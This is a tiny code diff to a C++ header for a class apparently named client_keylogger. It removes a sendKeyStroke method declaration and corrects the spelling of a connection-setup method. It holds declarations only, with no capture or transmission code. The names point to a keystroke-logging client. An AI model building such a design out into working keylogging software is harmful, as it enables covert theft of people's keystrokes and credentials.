@@ -7,10 +7,9 @@ class client_keylogger
 public:
 	client_keylogger(uint64_t(*scrambleFunc)(uint64_t));
 	~client_keylogger();
-	void sendKeyStroke(DWORD virtualKeyCode);
 
 private:
-	void connctInnit();
+	void connectInnit();
 
 };
 
